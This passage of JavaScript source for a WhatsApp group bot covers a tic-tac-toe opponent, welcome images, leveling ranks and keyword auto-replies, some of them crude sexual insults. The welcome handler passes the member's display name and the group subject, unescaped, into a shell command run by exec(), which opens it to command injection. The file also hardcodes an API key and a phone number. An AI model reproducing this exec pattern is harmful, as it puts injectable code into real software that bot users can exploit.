		(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
		(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
		(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
		(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
		//TESTE PARA TENTATIVA DE BLOQUEIO
		(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
		(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
		(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
		(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
		(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
		(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
		(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
	)){
		//NORMAL
		tttset.reActivate1 = "off"
		let randomNORMAL = Math.floor(Math.random() * 3)
		if (randomNORMAL == 0 || randomNORMAL == 1) {
			IAmove1()
		} else {
			while (tttset.reActivate2 == "on") {
				IAalter()
			}
		}
		tttset.reActivate2 = "on"
	} else {
		//EASY / RANDOM
		let randomALL = Math.floor(Math.random() * 9)
		switch (randomALL) {
			case 0:
				if (esp.a1 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.a1 = "⭕"
    	        }
    	    break
			case 1:
				if (esp.a2 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.a2 = "⭕"
    	        }
    	    break
			case 2:
				if (esp.a3 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.a3 = "⭕"
    	        }
    	    break
			case 3:
				if (esp.b1 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.b1 = "⭕"
    	        }
    	    break
			case 4:
				if (esp.b2 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.b2 = "⭕"
    	        }
    	    break
			case 5:
				if (esp.b3 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.b3 = "⭕"
    	        }
    	    break
			case 6:
				if (esp.c1 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.c1 = "⭕"
    	        }
    	    break
			case 7:
				if (esp.c2 == "🔲") {
    	            tttset.reActivate1 = "off"
    	            esp.c2 = "⭕"
    	        }
    	    break
			case 8:
				if (esp.c3 == "🔲") {
        	        tttset.reActivate1 = "off"
        	        esp.c3 = "⭕"
        	    }
        	break
		}
	}
}

const IAmove1 = () => {
	//JOGADA PARA VITÓRIA
	if (esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") {
		esp.a3 = "⭕"
	} else if (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") {
		esp.a2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") {
		esp.a1 = "⭕"
	} else if (esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") {
		esp.b3 = "⭕"
	} else if (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") {
		esp.b1 = "⭕"
	} else if (esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") {
		esp.c2 = "⭕"
	} else if (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") {
		esp.c1 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") {
		esp.b1 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") {
		esp.a1 = "⭕"
	} else if (esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") {
		esp.c2 = "⭕"
	} else if (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") {
		esp.a2 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") {
		esp.b3 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") {
		esp.a3 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") {
		esp.a1 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") {
		esp.a3 = "⭕"
	//JOGADA PARA BLOQUEIO
	} else if (esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") {
		esp.a3 = "⭕"
	} else if (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") {
		esp.a2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") {
		esp.a1 = "⭕"
	} else if (esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") {
		esp.b3 = "⭕"
	} else if (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") {
		esp.b2 = "⭕"
	} else if (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") {
		esp.b1 = "⭕"
	} else if (esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") {
		esp.c2 = "⭕"
	} else if (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") {
		esp.c1 = "⭕"
	} else if (esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") {
		esp.b1 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") {
		esp.a1 = "⭕"
	} else if (esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") {
		esp.c2 = "⭕"
	} else if (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") {
		esp.b2 = "⭕"
	} else if (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") {
		esp.a2 = "⭕"
	} else if (esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") {
		esp.b3 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") {
		esp.a3 = "⭕"
	} else if (esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") {
		esp.b2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") {
		esp.a1 = "⭕"
	} else if (esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") {
		esp.b2 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌") {
		esp.a3 = "⭕"
	}
}

//MOVIMENTO ALTERNATIVO
const IAalter = () => {
	let randomALTER = Math.floor(Math.random() * 9)
	switch (randomALTER) {
		case 0:
			if (esp.a1 == "🔲") {
                tttset.reActivate2 = "off"
                esp.a1 = "⭕"
            }
        break
		case 1:
			if (esp.a2 == "🔲") {
                tttset.reActivate2 = "off"
                esp.a2 = "⭕"
            }
        break
		case 2:
			if (esp.a3 == "🔲") {
                tttset.reActivate2 = "off"
                esp.a3 = "⭕"
            }
        break
		case 3:
			if (esp.b1 == "🔲") {
                tttset.reActivate2 = "off"
                esp.b1 = "⭕"
            }
        break
		case 4:
			if (esp.b2 == "🔲") {
                tttset.reActivate2 = "off"
                esp.b2 = "⭕"
            }
        break
		case 5:
			if (esp.b3 == "🔲") {
                tttset.reActivate2 = "off"
                esp.b3 = "⭕"
            }
        break
		case 6:
			if (esp.c1 == "🔲") {
                tttset.reActivate2 = "off"
                esp.c1 = "⭕"
            }
        break
		case 7:
			if (esp.c2 == "🔲") {
                tttset.reActivate2 = "off"
                esp.c2 = "⭕"
            }
        break
		case 8:
			if (esp.c3 == "🔲") {
                tttset.reActivate2 = "off"
                esp.c3 = "⭕"
            }
        break
	}
}

//JOGAR NOS CANTOS E CENTRO - IMPOSSIVEL
const priorityC = () => {
	let randomPriC = Math.floor(Math.random() * 5)
	switch (randomPriC) {
		case 0 :
			if (esp.a1 == "🔲") {
				tttset.reActivate3 = "off"
				esp.a1 = "⭕"
			}
		break
		case 1 :
			if (esp.a3 == "🔲") {
				tttset.reActivate3 = "off"
				esp.a3 = "⭕"
			}
		break
		case 2 :
			if (esp.b2 == "🔲") {
				tttset.reActivate3 = "off"
				esp.b2 = "⭕"
			}
		break
		case 3 :
			if (esp.c1 == "🔲") {
				tttset.reActivate3 = "off"
				esp.c1 = "⭕"
			}
		break
		case 4 :
			if (esp.c3 == "🔲") {
				tttset.reActivate3 = "off"
				esp.c3 = "⭕"
			}
		break
	}
}
///_ END TIC-TAC-TOE CONFIG by: Resen

//_CONEXÃO WHATSAPP WEB 
async function starts() {
	const tiringa = new WAConnection()
	tiringa.version = [2, 2119, 6]
	tiringa.logger.level = 'warn'
	console.log(banner.string)
	tiringa.on('qr', () => {
		console.log(color('👆'), color(' Scan the code above to start Walker-BOT!'))
	})

	fs.existsSync('./tiringa.json') && tiringa.loadAuthInfo('./tiringa.json')
	tiringa.on('connecting', () => {
		start('2', 'WHITE WALKER BOT CONNECTING...')
	})
	tiringa.on('open', () => {
		success('2', 'WHITE WALKER BOT CONNECTED!!!')
	})
	await tiringa.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./tiringa.json', JSON.stringify(tiringa.base64EncodedAuthInfo(), null, '\t'))

//_FUCTION DE BOAS-VINDAS
	//welcome
	tiringa.on('group-participants-update', async (anu) => {
	if (!welkom.includes(anu.jid)) return
	try {
		const mdata = await tiringa.groupMetadata(anu.jid)
		console.log(anu)
		if (anu.action == 'add') {
			myMonths = ["January", "February", "March", "Apri", "May", "June", "Julay", "Agust", "September", "October", "November", "Desember"];
			myDays = ['njayar','thinkal','chovva','budhan','bayem','velli','shani'];
			var tgl = new Date();
			var day = tgl.getDate()
			var bulan = tgl.getMonth()
			var thisDay = tgl.getDay(),
			thisDay = myDays[thisDay];
			var yy = tgl.getYear()
			var year = (yy < 1000) ? yy + 1900 : yy;
			const tanggalu = `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
			num = anu.participants[0]
			thu = await tiringa.getStatus(anu.participants[0], MessageType.text)
			membr = mdata.participants.length
			console.log(color('[SYSTEM]', 'cyan'), color('Ada orang masuk grup tuh kak, Siapa ya kak?', 'yellow'), color('(🤔)', 'white'))
			const moment = require('moment-timezone')
const jm = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			let d = new Date
				let locale = 'id'
					let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
					let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
					let week = d.toLocaleDateString(locale, { weekday: 'long' })
					let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})
				try {
pushnem = tiringa.contacts[num] != undefined ? tiringa.contacts[num].notify = undefined ? PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international') : tiringa.contacts[num].notify || tiringa.contacts[num].vname : PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international')
} catch { 
 pushnem = num.split('@')[0]
}
			try {
				ppimg = await tiringa.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
			} catch {
				ppimg = './dns/pp.jpeg'
			}
				exec(`magick './src/wel.jpg' -gravity west -fill '#000000' -font './src/font-gue.ttf' -size 1280x710 -pointsize 75 -interline-spacing 7.5 -annotate +460-50 '${pushnem}' -pointsize 35 -annotate +460+83 '${jm} ${calender}' -pointsize 50 -annotate +460+205 'Welcome To ${mdata.subject}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+60 -composite 'welcome.jpg'`)
				.on('error', () => reply('error'))
				.on('exit', () => {
			tiringa.sendMessage(mdata.id, fs.readFileSync('welcome.jpg'), MessageType.image, { caption: `\`\`\`Welcome In Gc ${mdata.subject}\`\`\`\n─────────────────\n\`\`\`Name : @${num.split('@')[0]}\`\`\`\n\`\`\`Bio : ${thu.status}\`\`\`\n\`\`\`Member To : ${membr}\`\`\`\n\`\`\`Date : ${tanggalu}\`\`\`\n\`\`\`Don’t Forget to Read the Description\`\`\`\n─────────────────\n`, contextInfo: { mentionedJid: [num] }})
			})
				//leave
		} else if (anu.action == 'remove') {
				num = anu.participants[0]
				try {
					ppimg = await tiringa.getProfilePicture(`${num.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `The member @${num.split('@')[0]} left the group ... bye bye👋`
				let buff = await getBuffer(ppimg)
				tiringa.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
		//antibule
	})
    tiringa.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})

      tiringa.on('chat-update', async (mek) => {
		try {
            if (!mek.hasNewMessage) return
            mek = mek.messages.all()[0]
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
			if (mek.key.fromMe) return
			global.prefix
			global.blocked
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const setGame = require('./ArifiSrc/tictactoe')
			const mentionUser = type == "extendedTextMessage" ? mek.message.extendedTextMessage.contextInfo.mentionedJid || [] : []
            mentionByReply = type == "extendedTextMessage" ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
            mentionUser.push(mentionByReply)
			const { text, catalogue, pdf, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Kolkata').format('DD/MM HH:mm:ss')
			const date = moment.tz('Asia/Kolkata').format('DD/MM/YY')
            const hr = moment.tz('Asia/Kolkata').format('HH:mm:ss')
            const timi = moment.tz('Asia/Kolkata').add(30, 'days').calendar();
            const timu = moment.tz('Asia/Kolkata').add(20, 'days').calendar();
            body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
			const isCmd2 = body.startsWith(prefix2)
            const anun = budy.slice(0).trim().split(/ +/).shift().toLowerCase()
            const testat = budy
            const totalchat = await tiringa.chats.all()
			const botNumber = tiringa.user.jid
			const ownerNumber = [`919446088620@s.whatsapp.net`]
			const ownerNumberB = []
			const isGroup = from.endsWith('@g.us')
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			const groupMetadata = isGroup ? await tiringa.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
            const isBanned = ban.includes(sender)
			const isWelkom = isGroup ? welkom.includes(from) : true
            const isNsfw = isGroup ? nsfw.includes(from) : true
			const isOwner = ownerNumber.includes(sender)
            const isUser = checkRegisteredUser(sender)
			const isPremium= prem.includes(sender)
			const isOwnerB = ownerNumberB.includes(sender)
            const isLevelingOn = isGroup ? _leveling.includes(from) : true
            const q = args.join(' ')
            const id = botNumber
            const tescuk = ["WHITE WALKER@s.whatsapp.net"]
            const lolhumankey = 'b170074ac846042f35937286'
			let pushname = tiringa.contacts[sender] != undefined ? tiringa.contacts[sender].vname || tiringa.contacts[sender].notify: undefined
let ppgc = await tiringa.getProfilePicture(from)
    const ftoko = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage": { "product": { "productImage":{ "imageMessage": "image/jpeg", "jpegThumbnail": fs.readFileSync(`./team.jpg`)}, "title": `oi ${pushname}`, "description": "White walker ۞", "currencyCode": "INR", "priceAmount1000": "50000000", "retailerId": "White walker ۞", "productImageCount": 1}, "businessOwnerJid": `919446088620@s.whatsapp.net`}}}

			const reply = (tej) => {
				tiringa.sendMessage(from, tej, text, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
			}
			const sendMess = (teks) => {
				tiringa.sendMessage(from, teks, text)
			}
            const sendImage = (tis) => {
		        tiringa.sendMessage(from, tis, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
		   }              
			const mentions = (ops, memberr, sender, id) => {
				(id == null || id == undefined || id == false) ? tiringa.sendMessage(from, ops.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : tiringa.sendMessage(from, ops.trim(), extendedText, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
			const costum = (pesan, tipe, target, target2) => {
                 tiringa.sendMessage(from, pesan, tipe, {quoted: {key: {fromMe: false, participant: `${target}`, ...(from ? {remoteJid: from}: {})}, message: {conversation: `${target2}` }}})
            }
             const sendPtt = (teks) => {
                 tiringa.sendMessage(from, audio, mp3, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
            }
             const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '919567997462-1614953337@g.us' } : {}) }, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./team.jpg'), surface: 200, message: `hi`, orderTitle: `andi`, sellerJid: `0@s.whatsapp.net`}}}
//_FUCTION PATENTE
const nivelAtual = getLevelingLevel(sender)
var patt = 'Bronze I🥉'
if (nivelAtual === 1) {patt = 'Bronze  I🥉' } else if (nivelAtual === 2) {patt = 'Bronze II🥉'} else if (nivelAtual === 3) {patt = 'Bronze  III🥉'} else if (nivelAtual === 4) {patt = 'Bronze  IV🥉'} else if (nivelAtual === 5) {patt = 'Bronze  V🥉'} else if (nivelAtual === 6) {patt = 'Silver I🥈'} else if (nivelAtual === 7) {patt = 'Silver II🥈'} else if (nivelAtual === 8) {patt = 'Silver III🥈'} else if (nivelAtual === 9) {patt = 'Silver IV🥈'} else if (nivelAtual === 10) {patt = 'Silver V🥈'} else if (nivelAtual === 11) {patt = 'gold I🥇'} else if (nivelAtual === 12) {patt = 'gold II🥇'} else if (nivelAtual === 13) {patt = 'gold III🥇'} else if (nivelAtual === 14) {patt = 'Gold IV🥇'} else if (nivelAtual === 15) {patt = 'gold V🥇'} else if (nivelAtual === 16) {patt = 'Champion I🏆'} else if (nivelAtual === 17) {patt = 'Champion II🏆'} else if (nivelAtual === 18) {patt = 'Champion III🏆'} else if (nivelAtual === 19) {patt = 'Champion IV🏆'} else if (nivelAtual === 20) {patt = 'Champion V🏆'} else if (nivelAtual === 21) {patt = 'Diamond I 💎'} else if (nivelAtual === 22) {patt = 'Diamond II 💎'} else if (nivelAtual === 23) {patt = 'Diamond III 💎'} else if (nivelAtual === 24) {patt = 'Diamond IV 💎'} else if (nivelAtual === 25) {patt = 'Diamond V 💎'} else if (nivelAtual === 26) {patt = 'Teacher I 🐂'} else if (nivelAtual === 27) {patt = 'Teacher II 🐂'} else if (nivelAtual === 28) {patt = 'Teacher III 🐂'} else if (nivelAtual === 29) {patt = 'Teacher IV 🐂'} else if (nivelAtual === 30) {patt = 'Teacher V 🐂'} else if (nivelAtual === 31) {patt = 'Mythical I 🔮'} else if (nivelAtual === 32) {patt = 'Mythical II 🔮'} else if (nivelAtual === 33) {patt = 'Mythical III 🔮'} else if (nivelAtual === 34) {patt = 'Mythical IV 🔮'} else if (nivelAtual === 35) {patt = 'Mythical V 🔮'} else if (nivelAtual === 36) {patt = 'God I🕴'} else if (nivelAtual === 37) {patt = 'God II🕴'} else if (nivelAtual === 38) {patt = 'God III🕴'} else if (nivelAtual === 39) {patt = 'God IV🕴'} else if (nivelAtual === 40) {patt = 'God V🕴'} else if (nivelAtual > 41) {patt = '🛐Great Teacher🛐'}
          
//_TIPO DE USUÁRIO
if (groupAdmins) {prema = 'Admin🤓'}if (isPremium) {prema = 'Premium😎'} if (isOwner) {prema = 'The anonymous🕴🏽'} if (isUser) {prema = 'Registered 🥳'} else {var prema = 'Common member🗿'}

//_XP COM LEVELING ATIVO


//_DINHEIRO 
if (isGroup) {
const checkATM = checkATMuser(sender)
try {
if (checkATM === undefined) addATM(sender)
const uangsaku = Math.floor(Math.random() * 10) + 90
addKoinUser(sender, uangsaku)
} catch (err) {
console.error(err)
}
}
            


////FINALIZAR TTT AUTOMATICAMENTE By: Resen
if (tttset.tttstatus == "off" && tttset.autoEndTime == "on") {
tttset.autoEndTime = "off"
} else if (tttset.tttstatus == "on" && tttset.autoEndTime == "on") {
if (isLevelingOn) {
const randomEndTTTXP = 0 - (Math.floor(Math.random() * 75) + 75)
addLevelingXp(tttset.player, randomEndTTTXP)
const checkTTTIdEnd = getTTTId(tttset.player)
if (checkTTTIdEnd === undefined) addTTTId(tttset.player)
addTTTpoints(tttset.player, randomEndTTTXP)
tiringa.sendMessage(tttset.local,`❌ GAME TIME EXPIRED ❌\n\n➣  PUNISHMENT: ${randomEndTTTXP} XP 🔮`, text, {quoted: tttset.mentionPlayer})
} else {
tiringa.sendMessage(tttset.local,`❌ GAME TIME EXPIRED ❌`, text, {quoted: tttset.mentionPlayer})
}
esp.a1 = "🔲"; esp.a2 = "🔲"; esp.a3 = "🔲"
esp.b1 = "🔲"; esp.b2 = "🔲"; esp.b3 = "🔲"
esp.c1 = "🔲"; esp.c2 = "🔲"; esp.c3 = "🔲"
tttset.tttstatus = "off"
tttset.autoEndTime = "off"
}

//_TIPO DE MENSAGENS
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
const isQuotedText = type === 'extendedTextMessage' && content.includes('textMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

//_CORES(cores das letras no terminal)
colors = ['red','white','black','blue','yellow','green','aqua','magenta','orange']

//_VISUALIZA AS MENSAGENS 
tiringa.chatRead(from)

//if (isCmd && isMute && !isGroupAdmins && !isOwner && !isPremium) return

//ANTI-SPAM BY ITALU
if (isCmd && msgFilter.isFiltered(from)) {
tiringa.sendMessage(from, `No flood @${sender.split('@')[0]}...\n\nWait 5 seconds before using another command✅`, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, contextInfo: {mentionedJid: [sender]}})
return console.log(color('SPAM', 'red'), color(moment.tz('Asia/Kolkata').format('HH:mm:ss'), 'yellow'), color(`${command}`),'DE:', color(pushname))}

//_CONTAGEM DE COMANDOS
if (isCmd) cmdadd()
		
//_USUÁRIO BANIDO
if (isCmd && isBanned) {
reply(ptbr.ban())
return console.log(color('[BAN] Ignorando comando', 'blue'), color(moment.tz('Asia/Kolkata').format('HH:mm:ss'), 'yellow'), color(`${command}`),'DE:', color(pushname))}
          
//_COMANDOS
if (!isGroup && isCmd) console.log(color('COMANDO RECEBIDO', 'magenta'), color('HORA:', 'orange'), color(moment.tz('Asia/Kolkata').format('HH:mm:ss'), 'yellow'), color('COMANDO:'), color(`${command}`),'DE:', color(pushname))
if (isCmd && isGroup) console.log(color('COMANDO RECEBIDO', 'magenta'), color('HORA:', 'orange'), color(moment.tz('Asia/Kolkata').format('HH:mm:ss'), 'yellow'), color('COMANDO:'), color(`${command}`),'DE:', color(pushname),'EM:', color(groupName))
			
//_MENSAGENS
if (!isCmd && isGroup) console.log(color('MENSAGEM RECEBIDA', 'aqua'), color('HORA:', 'orange'), color(moment.tz('Asia/Kolkata').format('HH:mm:ss'), 'yellow'), 'DE:', color(pushname),'EM:', color(groupName))
if (!isGroup && !isCmd) console.log(color('MENSAGEM RECEBIDA', 'aqua'), color('HORA:', 'orange'), color(moment.tz('Asia/Kolkata').format('HH:mm:ss'), 'yellow'), 'DE:', color(pushname))

//_RESPONDER AUTOMATICAMENTE
if ((budy === 'bot') || (budy === 'BOT') || (budy === 'Bot')) {
result = fs.readFileSync(`./src/mask.webp`)
tiringa.sendMessage(from, result, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
}

if ((budy === "fdp") || (budy === "Fdp") || (budy === "FDP")) {
tiringa.updatePresence(from, Presence.composing)
reply("teu pai")
}
if ((budy === "oi bot") || (budy === "Oi bot")) {
tiringa.updatePresence(from, Presence.composing)
reply("oi")
}
if ((budy === "vtnc") || (budy === "Vtnc")) {
tiringa.updatePresence(from, Presence.composing)
reply("Taking it in the ass is vitamin, like you and your cousins")
}
if ((budy === "vsfd") || (budy === "Vsfd")) {
tiringa.updatePresence(from, Presence.composing)
reply("Vtnc")
}
if ((budy.match("sexo")) || (budy.match("Sexo"))) {
tiringa.updatePresence(from, Presence.composing)
reply(`you talked about coitus?KKKKKKKKKKKKKKKKKKKKKKKKK :v`)
}
if (budy === "pnc") {
tiringa.updatePresence(from, Presence.composing)
reply(`hi ${pushname}`)
}
if ((budy === "cleito") || (budy === "Cleito")) {
cleitu = fs.readFileSync(`./src/edmi.webp`)
tiringa.sendMessage(from, cleitu, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
}
if ((budy === "Edmilson") || (budy === "edmilson")) {
cleitu = fs.readFileSync(`./src/cleito.webp`)
tiringa.sendMessage(from, cleitu, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
}
if ((budy.includes('kkkkkkkkkkk')) || (budy.includes('KKKKKKKKKK'))) {
reply('What’s funny?🤨')
}

if (budy.match('blackwalker')) {
result = fs.readFileSync(`./src/mask.webp`)
